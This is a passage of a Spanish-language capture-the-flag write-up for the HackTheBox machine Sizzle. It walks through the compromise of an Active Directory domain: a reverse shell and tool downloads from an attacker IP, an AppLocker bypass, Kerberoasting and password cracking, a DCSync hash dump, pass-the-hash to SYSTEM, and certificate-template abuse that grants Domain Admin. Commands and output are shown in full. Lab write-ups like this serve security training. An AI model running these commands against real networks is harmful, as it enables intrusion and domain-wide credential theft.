+<p class="plain-text">Esto se debe a nuestro contexto de ejecucion ya que el modo de lenguaje es <code class="language-plaintext highlighter-rouge">ConstrainedLenguage</code> lo que significa que estamos restringidos en varios aspectos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\amanda\Documents> </span><span class="ve">$ExecutionContext</span><span class="p">.SessionState.LanguageMode  
+ConstrainedLanguage
+PS C:\Users\amanda\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para bypassear esto podemos usar <a href="https://github.com/padovah4ck/PSByPassCLM">PSByPassCLM</a> que tiene una funcion para entablar una reverse shell pero con una powershell sin el <code class="language-plaintext highlighter-rouge">ConstrainedLenguage</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\amanda\Documents> </span><span class="am">curl </span><span class="p">10.10.14.10/PsBypassCLM.exe </span><span class="c1">-o </span><span class="p">PsBypassCLM.exe
+PS C:\Users\amanda\Documents> </span><span class="am">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe</span><span class="p"> /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.10 /rport=443 C:\Users\amanda\Documents\PsBypassCLM.exe  
+Microsoft (R) .NET Framework Installation utility Version 4.6.1586.0
+Copyright (C) Microsoft Corporation.  All rights reserved.
+
+The uninstall is beginning.
+See the contents of the log file for the C:\Users\amanda\Documents\PsBypassCLM.exe assembly's progress.
+The file is located at .
+Uninstalling assembly 'C:\Users\amanda\Documents\PsBypassCLM.exe'.
+Affected parameters are:
+   assemblypath = C:\Users\amanda\Documents\PsBypassCLM.exe
+   rport = 443
+   revshell = true
+   rhost = 10.10.14.10
+   logtoconsole = true
+   logfile =
+Trying to connect back...
+PS C:\Users\amanda\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de ejecutarlo recibimos una <code class="language-plaintext highlighter-rouge">powershell</code> en nuestro listener aun como el usuario amanda pero esta vez sin la limitacion ya que tenemos un <code class="language-plaintext highlighter-rouge">FullLanguage</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.10.103
+Windows PowerShell 
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.  
+
+PS C:\Users\amanda\Documents> </span><span class="am">whoami</span><span class="p">
+htb\amanda
+PS C:\Users\amanda\Documents> </span><span class="ve">$ExecutionContext</span><span class="p">.SessionState.LanguageMode
+FullLanguage
+PS C:\Users\amanda\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora podemos importar el modulo de <code class="language-plaintext highlighter-rouge">SharpHound</code> para despues invocarlo y que nos recolecte informacion sobre el dominio, esto guardara la informacion en un <code class="language-plaintext highlighter-rouge">zip</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\amanda\Documents> </span><span class="am">Import-Module </span><span class="p">.\SharpHound.ps1                
+PS C:\Users\amanda\Documents> </span><span class="am">Invoke-BloodHound </span><span class="c1">-CollectionMethod </span><span class="p">All
+PS C:\Users\amanda\Documents> </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\Users\amanda\Documents
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        8/20/2023   1:18 AM          12276 20230820011815_BloodHound.zip  
+-a----        8/20/2023   1:18 AM        1391869 SharpHound.ps1
+
+PS C:\Users\amanda\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de subir el zip a <code class="language-plaintext highlighter-rouge">bloodhound</code> tenemos diferentes querys que podemos utilizar, al listar los usuarios kerberoasteables podemos encontrar a <code class="language-plaintext highlighter-rouge">mrlky</code></p>
+<a href="/htb/sizzle/9.png" target="_blank"><div><p><img src="/htb/sizzle/9.png"></p></div></a>
+
+<p class="plain-text">Tenemos otra limitación y es que aunque el puerto de kerberos que es el <code class="language-plaintext highlighter-rouge">88</code> esta abierto no podemos verlo desde el exterior y lo necesitamos para poder avanzar</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\amanda\Documents> </span><span class="am">netstat </span><span class="c1">-oat</span><span class="p">
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID      Offload State  
+
+  TCP    0.0.0.0:21             sizzle:0               LISTENING       2452     InHost
+  TCP    0.0.0.0:80             sizzle:0               LISTENING       4        InHost
+  TCP    0.0.0.0:88             sizzle:0               LISTENING       628      InHost
+  TCP    0.0.0.0:135            sizzle:0               LISTENING       856      InHost
+  TCP    0.0.0.0:389            sizzle:0               LISTENING       628      InHost
+  TCP    0.0.0.0:443            sizzle:0               LISTENING       4        InHost
+  TCP    0.0.0.0:445            sizzle:0               LISTENING       4        InHost
+  TCP    0.0.0.0:464            sizzle:0               LISTENING       628      InHost
+  TCP    0.0.0.0:593            sizzle:0               LISTENING       856      InHost
+  TCP    0.0.0.0:636            sizzle:0               LISTENING       628      InHost
+  TCP    0.0.0.0:3268           sizzle:0               LISTENING       628      InHost
+  TCP    0.0.0.0:3269           sizzle:0               LISTENING       628      InHost
+  TCP    0.0.0.0:5985           sizzle:0               LISTENING       4        InHost
+  TCP    0.0.0.0:5986           sizzle:0               LISTENING       4        InHost
+  TCP    0.0.0.0:9389           sizzle:0               LISTENING       2412     InHost
+.............................................................................................
+
+PS C:\Users\amanda\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos pensar en crear un tunel <code class="language-plaintext highlighter-rouge">socks5</code> con chisel pero al intentar ejecutarlo tenemos otra limitacion y es que por politicas no podemos ejecutar archivos <code class="language-plaintext highlighter-rouge">exe</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\amanda\Documents> </span><span class="am">curl </span><span class="p">10.10.14.10/chisel.exe </span><span class="c1">-o </span><span class="p">chisel.exe
+PS C:\Users\amanda\Documents> </span><span class="am">.\chisel.exe </span><span class="p">client 10.10.14.10:9999 R:socks
+</span><span class="ro">Program 'chisel.exe' failed to run: This program is blocked by group policy. For more information, contact your system administratorAt line:1 char:1  
++ .\chisel.exe client 10.10.14.10:9999 R:socks
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
+At line:1 char:1
++ .\chisel.exe client 10.10.14.10:9999 R:socks
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed</span><span class="p">
+PS C:\Users\amanda\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Revisando las politicas podemos ver una regla que dice que todos los ejecutables creados a partir de <code class="language-plaintext highlighter-rouge">C:\Windows</code> pueden ser ejecutados por cualquier usuario</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\amanda\Documents> </span><span class="am">Get-AppLockerPolicy </span><span class="c1">-Effective </span><span class="p">| </span><span class="am">Select </span><span class="c1">-ExpandProperty </span><span class="p">RuleCollections
+
+PublisherConditions : {*\*\*,0.0.0.0-*}
+PublisherExceptions : {}
+PathExceptions      : {}
+HashExceptions      : {}
+Id                  : a9e18c21-ff8f-43cf-b9fc-db40eed693ba
+Name                : (Default Rule) All signed packaged apps
+Description         : Allows members of the Everyone group to run packaged apps that are signed.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {%WINDIR%\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
+Name                : (Default Rule) All files located in the Windows folder
+Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {%OSDRIVE%\tmp\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : d754b869-d2cc-46af-9c94-6b6e8c10d095
+Name                : All files located in the Program Files folder
+Description         : Allows members of the Everyone group to run applications that are located in the Program Files folder.  
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PS C:\Users\amanda\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos simplemente descargar nuevamente <code class="language-plaintext highlighter-rouge">chisel.exe</code> en <code class="language-plaintext highlighter-rouge">C:\Windows\Temp</code> y como con ello cumplimos la regla lo podemos ejecutar para crear el tunel <code class="language-plaintext highlighter-rouge">socks5</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Windows\Temp> </span><span class="am">curl 10.10.14.10/chisel.exe</span><span class="c1"> -o </span><span class="p">chisel.exe
+PS C:\Windows\Temp> </span><span class="am">.\chisel.exe </span><span class="p">client 10.10.14.10:9999 R:socks  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ chisel </span><span class="p">server --reverse --port 9999
+server: Reverse tunnelling enabled
+server: Listening on http://0.0.0.0:9999
+server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Pasando por el tunel con <code class="language-plaintext highlighter-rouge">proxychains</code> podemos explotar usar <code class="language-plaintext highlighter-rouge">GetUserSPNs</code> para aprovechandonos de lo que vimos en bloodhound obtener el hash de <code class="language-plaintext highlighter-rouge">mrlky</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q impacket-GetUserSPNs htb.local/amanda:Ashare1972 -request
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+ServicePrincipalName  Name   MemberOf                                               PasswordLastSet             LastLogon                   Delegation 
+--------------------  -----  -----------------------------------------------------  --------------------------  --------------------------  ----------
+http/sizzle           mrlky  CN=Remote Management Users,CN=Builtin,DC=HTB,DC=LOCAL  2018-07-10 13:08:09.536421  2018-07-12 09:23:50.871575             
+
+$krb5tgs$23$*mrlky$HTB.LOCAL$htb.local/mrlky*$2eedace6780d18a7ccb1f15d82d1a2af$ea65e4d6c9b52ab78ded932c6bb7a3c10f7144a7d4fa6f9f02de581122b59435d8b62c5909ae032d4de96c70362b228bdd89a6b02ef32e1a47678ad78b20df3a263b306d78eebf92140d2c9db0f6c3973c1f6918ee31bb9d01960a85fb8e7728da4af994c67befac1827ab58a53188a30ef1a3304f9d03afbda6a2ad27bccebf143b7a467efcf46eec9cfdb6b6a44d1c9506af2db5dd1b4703c65f6c9c395773c6a3a62d478708a44271d4194537081057f58c8fe09abf0d572fec46537076d88637d39a19a992da3f96a066709d49370e1e33d102b4552d784781c69406221f54366fd6a24833b03b11a1813a37c66cd1f452bf17af38004cd9b5b7dd2def7ad3bac974a1a5cc98a8677a5ae25e3afbafab45acda0972051d421961fef484f6697f333937e8e01358261dcaaf5f2ad6e9cc08b6a458683bed1711fe9efc155c3fa91a843842a3625cbcbbb54e34374cdbf542fb019b99fcc97935d4d70d72d7337d62abd90cca2897d04e2065e33ff7ab9e2c1d6818f439d0293722bc9380a8ca8972d64dc8604e433a1b96538b7f5c808d6b9d89770d500b29d3a8b23f1a5dfc673e46d689972321e40455eadb5a7f3142afc736570a3047ef77c48c4b1d3212f1961a6ff53f2e2008c257f22b886642ed9e259fdf6bd407af210daba5d469c62260071f00f690bcefda75e895cf6d1426501213075887ee90976c01f4ac95e9b1718c3df0f1ebe1a97d795f72919fbb2dbc96db9cafac61aa02c81068f80ddf8fd00cbb0925fdba0b3f396fa5c8f4e8f30f3b803e9a8af3e6b17fa7fbf9ec82f60f14179653315f4ce112e529de0e1972d492f943893b43a9f4e4ebdd2defef0b1ff68f0f335162cd35dfff0eb435ff5d47ba6153361a9c8b296e1d26c35a154c4069b1aa07816b148833d021e3251618d95d780dfbc2d8552887da73a85d01509ecdd784353a0d459ee5bf484a4760d085a01d36dab32f532f3676981f5146fb4411f7d930fcfd40d3bca03d468a500727b748555a016fd1d9894f215e5e4edfaa21bb0c3d2d9c46bc76b45e40d9dca35cd7f1e0246b59b1035483d22a3bfd73a8854f51c832253408122e5825469c27b5634adfac127181d380ed59be07fa98806f0678687e06e2027a4019b8bc2fa1f322206013637db99e7d89a3f4878fe90819200c47b5ccee9b1b1ee7c3b3e88bb6ba381d8ae53a7812a66dd0b26e2f519f6af790ae09ea517f307fcec955530c0c687b240565  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El hash que conseguimos es bastante debil y lo crackeamos facilmente usando <code class="language-plaintext highlighter-rouge">john</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])  
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">Football#7</span><span class="p">       (</span><span class="am">?</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos la contraseña con <code class="language-plaintext highlighter-rouge">crackmapexec</code> y nos devuelve que esta es valida</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb htb.local -u mrlky -p Football#7
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="ve">[+] </span><span class="p">HTB.LOCAL\mrlky:Football#7</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Volvemos hacer el proceso de crear el certificado con <code class="language-plaintext highlighter-rouge">certipy</code> esta vez con las credenciales de <code class="language-plaintext highlighter-rouge">mrlky</code> y con el nuevo <code class="language-plaintext highlighter-rouge">crt</code> y la <code class="language-plaintext highlighter-rouge">key</code> nos conectamos a winrm</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ certipy </span><span class="p">req -target htb.local -u mrlky -p Football#7 -ca HTB-SIZZLE-CA  
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 23
+[*] Got certificate with UPN 'mrlky@HTB.LOCAL'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'mrlky.pfx'
+
+</span><span class="ve">❯ certipy </span><span class="p">cert -pfx mrlky.pfx -nokey -out mrlky.crt
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Writing certificate and  to 'mrlky.crt'
+
+</span><span class="ve">❯ certipy </span><span class="p">cert -pfx mrlky.pfx -nocert -out mrlky.key
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Writing private key to 'mrlky.key'</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm </span><span class="p">-S -i htb.local -c mrlky.crt -k mrlky.key  
+PS C:\Users\mrlky\Documents> </span><span class="am">whoami</span><span class="p">
+htb\amanda
+PS C:\Users\mrlky\Documents> </span><span class="am">type </span><span class="p">..\Desktop\user.txt
+454**************************593
+PS C:\Users\mrlky\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Volviendo a <code class="language-plaintext highlighter-rouge">bloodhound</code> encontramos que el usuario <code class="language-plaintext highlighter-rouge">mrlky</code> tiene privilegios <code class="language-plaintext highlighter-rouge">DCSync</code> sobre el dominio por lo que podemos dumpear los hashes del <code class="language-plaintext highlighter-rouge">ntds.dit</code></p>
+<a href="/htb/sizzle/10.png" target="_blank"><div><p><img src="/htb/sizzle/10.png"></p></div></a>
+
+<p class="plain-text">Para explotarlo podemos hacerlo facilmente usando <code class="language-plaintext highlighter-rouge">crackmapexec</code> usando <code class="language-plaintext highlighter-rouge">--ntds</code> y con <code class="language-plaintext highlighter-rouge">drsuapi</code> como metodo, asi obtenemos todos los hashes <code class="language-plaintext highlighter-rouge">NT</code> del dominio</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb htb.local -u mrlky -p Football#7 --ntds drsuapi
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="ve">[+] </span><span class="p">HTB.LOCAL\mrlky:Football#7 
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="ro">[-] </span><span class="p">RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:73d400aa1750745557a5785eac8301a0:::</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya con el hash NT del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> haciendo un passthehash podemos autenticarnos con <code class="language-plaintext highlighter-rouge">psexec</code> y obtener una shell como <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-psexec </span><span class="p">htb.local/Administrator@sizzle.htb.local -hashes :f6b7160bfc91823792e0ac3a162c9267  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Requesting shares on sizzle.htb.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file PZQqHJdn.exe
+[*] Opening SVCManager on sizzle.htb.local.....
+[*] Creating service NaUn on sizzle.htb.local.....
+[*] Starting service NaUn.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
+3b7**************************bd7
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="extra1-administrator">
+<br><h3 class="post-title">Extra 1 - Administrator</h3><br>
+
+<p class="plain-text">Ya que desde el usuario amanda trabajamos con <code class="language-plaintext highlighter-rouge">ADCS</code> podemos buscar templates vulnerables con certipy, al hacerlo encontramos el template <code class="language-plaintext highlighter-rouge">SSL</code> vulnerable a <code class="language-plaintext highlighter-rouge">ESC4</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ certipy </span><span class="p">find -vulnerable -target htb.local -u amanda -p Ashare1972 -stdout
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 35 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 13 enabled certificate templates
+[*] Trying to get CA configuration for 'HTB-SIZZLE-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'HTB-SIZZLE-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.  
+[*] Trying to get CA configuration for 'HTB-SIZZLE-CA' via RRP
+[*] Got CA configuration for 'HTB-SIZZLE-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : HTB-SIZZLE-CA
+    DNS Name                            : sizzle.HTB.LOCAL
+    Certificate Subject                 : CN=HTB-SIZZLE-CA, DC=HTB, DC=LOCAL
+    Certificate Serial Number           : 753496F256EE309F456E223A2AE01EA2
+    Certificate Validity Start          : 2018-07-02 20:26:03+00:00
+    Certificate Validity End            : 2028-07-02 20:36:02+00:00
+    Web Enrollment                      : Enabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : HTB.LOCAL\Administrators
+      Access Rights
+        ManageCa                        : HTB.LOCAL\Administrators
+                                          HTB.LOCAL\Domain Admins
+                                          HTB.LOCAL\Enterprise Admins
+        ManageCertificates              : HTB.LOCAL\Administrators
+                                          HTB.LOCAL\Domain Admins
+                                          HTB.LOCAL\Enterprise Admins
+        Enroll                          : HTB.LOCAL\Authenticated Users
+    [!] Vulnerabilities
+      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
+Certificate Templates
+  0
+    Template Name                       : SSL
+    Display Name                        : SSL
+    Certificate Authorities             : HTB-SIZZLE-CA
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : PublishToDs
+    Extended Key Usage                  : Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 2 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Object Control Permissions
+        Owner                           : HTB.LOCAL\Administrator
+        Full Control Principals         : HTB.LOCAL\Domain Admins
+                                          HTB.LOCAL\Enterprise Admins
+                                          HTB.LOCAL\Administrator
+                                          HTB.LOCAL\Authenticated Users
+        Write Owner Principals          : HTB.LOCAL\Domain Admins
+                                          HTB.LOCAL\Enterprise Admins
+                                          HTB.LOCAL\Administrator
+                                          HTB.LOCAL\Authenticated Users
+        Write Dacl Principals           : HTB.LOCAL\Domain Admins
+                                          HTB.LOCAL\Enterprise Admins
+                                          HTB.LOCAL\Administrator
+                                          HTB.LOCAL\Authenticated Users
+        Write Property Principals       : HTB.LOCAL\Domain Admins
+                                          HTB.LOCAL\Enterprise Admins
+                                          HTB.LOCAL\Administrator
+                                          HTB.LOCAL\Authenticated Users
+    [!] Vulnerabilities
+      ESC4                              : 'HTB.LOCAL\\Authenticated Users' has dangerous permissions</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aqui la vulnerabilidad de <code class="language-plaintext highlighter-rouge">ESC4</code> es para todos los usuarios autenticados podemos modificar el template como amanda para que tambien sea vulnerable a <code class="language-plaintext highlighter-rouge">ESC1</code> y otros</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ certipy </span><span class="p">template -target htb.local -u amanda -p Ashare1972 -template SSL
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Updating certificate template 'SSL'
+[*] Successfully updated 'SSL'
+
+</span><span class="ve">❯ certipy </span><span class="p">find -vulnerable -target htb.local -u amanda -p Ashare1972 -stdout
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 35 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 13 enabled certificate templates
+[*] Trying to get CA configuration for 'HTB-SIZZLE-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'HTB-SIZZLE-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.  
+[*] Trying to get CA configuration for 'HTB-SIZZLE-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'HTB-SIZZLE-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : HTB-SIZZLE-CA
+    DNS Name                            : sizzle.HTB.LOCAL
+    Certificate Subject                 : CN=HTB-SIZZLE-CA, DC=HTB, DC=LOCAL
+    Certificate Serial Number           : 753496F256EE309F456E223A2AE01EA2
+    Certificate Validity Start          : 2018-07-02 20:26:03+00:00
+    Certificate Validity End            : 2028-07-02 20:36:02+00:00
+    Web Enrollment                      : Enabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : HTB.LOCAL\Administrators
+      Access Rights
+        ManageCa                        : HTB.LOCAL\Administrators
+                                          HTB.LOCAL\Domain Admins
+                                          HTB.LOCAL\Enterprise Admins
+        ManageCertificates              : HTB.LOCAL\Administrators
+                                          HTB.LOCAL\Domain Admins
+                                          HTB.LOCAL\Enterprise Admins
+        Enroll                          : HTB.LOCAL\Authenticated Users
+    [!] Vulnerabilities
+      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
+Certificate Templates
+  0
+    Template Name                       : SSL
+    Display Name                        : SSL
+    Certificate Authorities             : HTB-SIZZLE-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : True
+    Any Purpose                         : True
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Private Key Flag                    : ExportableKey
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 5 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Object Control Permissions
+        Owner                           : HTB.LOCAL\Administrator
+        Full Control Principals         : HTB.LOCAL\Authenticated Users
+        Write Owner Principals          : HTB.LOCAL\Authenticated Users
+        Write Dacl Principals           : HTB.LOCAL\Authenticated Users
+        Write Property Principals       : HTB.LOCAL\Authenticated Users
+    [!] Vulnerabilities
+      ESC1                              : 'HTB.LOCAL\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
+      ESC2                              : 'HTB.LOCAL\\Authenticated Users' can enroll and template can be used for any purpose
+      ESC3                              : 'HTB.LOCAL\\Authenticated Users' can enroll and template has Certificate Request Agent EKU set
+      ESC4                              : 'HTB.LOCAL\\Authenticated Users' has dangerous permissions</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya con la vulnerabilidad de <code class="language-plaintext highlighter-rouge">ESC1</code> sobre el template <code class="language-plaintext highlighter-rouge">SSL</code> podemos obtener un <code class="language-plaintext highlighter-rouge">pfx</code> como Administrator que podemos usar posteriormente para autenticarnos a ldap</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ certipy </span><span class="p">req -target htb.local -u amanda -p Ashare1972 -ca HTB-SIZZLE-CA -template SSL -upn Administrator@htb.local  
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 24
+[*] Got certificate with UPN 'Administrator@htb.local'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'</code>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora con el pfx del usuario Administrator usar el parametro <code class="language-plaintext highlighter-rouge">-ldap-shell</code> de certipy para realizar algunas acciones como agregar a <code class="language-plaintext highlighter-rouge">amanda</code> al grupo <code class="language-plaintext highlighter-rouge">Domain Admins</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ certipy </span><span class="p">auth -pfx administrator.pfx -ldap-shell -dc-ip 10.10.10.103  
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Connecting to 'ldaps://10.10.10.103:636'
+[*] Authenticated to '10.10.10.103' as: u:HTB\Administrator
+Type help for list of commands
+
+# add_user_to_group amanda 'Domain Admins'
+Adding user: amanda to group Domain Admins result: OK
+
+#</span>
+</code></pre></div></div><br>
+
